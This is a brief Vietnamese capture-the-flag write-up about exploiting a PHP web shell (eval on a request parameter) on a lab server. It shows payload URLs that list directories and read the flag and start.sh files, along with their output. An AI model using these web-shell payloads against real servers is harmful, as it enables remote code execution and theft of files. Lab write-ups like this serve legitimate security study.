# Web shell

Address: http://172.104.49.143:1573/

Dùng dirsearch ta tìm được `/shell.php`

Payload nè
```
http://172.104.49.143:1573/shell.php?cmd=echo "hello"; echo "hi";
```

Nhận được

```php
hellohi <?php
    @eval($_REQUEST['cmd']);
    show_source(__FILE__);
?>
```
Code hoạt động với multiple command

Ở đây ta sử dụng lệnh `scandir($dir);` tương tự lệnh `ls` trên bash

Payload tiếp nè
```
http://172.104.49.143:1573/shell.php?cmd=$dir='./'; $files = scandir($dir); print_r($files);
```

```php
Array ( [0] => . [1] => .. [2] => assets [3] => images [4] => index.php [5] => shell.php ) <?php
    @eval($_REQUEST['cmd']);
    show_source(__FILE__);
?>
```

Lùi khoảng 3 lần ta thấy có flag nè
```
http://172.104.49.143:1573/shell.php?cmd=$dir='../../../'; $files = scandir($dir); print_r($files);
```

```php
Array ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => flag [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) <?php
    @eval($_REQUEST['cmd']);
    show_source(__FILE__);
?>
```
Okie vậy là đã biết địa chỉ của flag
```
http://172.104.49.143:1573/shell.php?cmd=echo readfile('../../../flag'); 
```

```php
<?php
    @eval($_REQUEST['cmd']);
    show_source(__FILE__);
?>
```

Ủa gì z??? Sao k có gì :)?

Nhưng đoạn này k giải thích gì nữa
```
http://172.104.49.143:1573/shell.php?cmd=echo readfile('../../../start.sh'); 
```

```php
#!/bin/sh echo "Flag{bypass_disable_function_php}" > /flag chmod 600 /flag chmod +s /usr/bin/tac /etc/init.d/apache2 restart /usr/bin/tail -f /dev/null152 <?php
    @eval($_REQUEST['cmd']);
    show_source(__FILE__);
?>
```



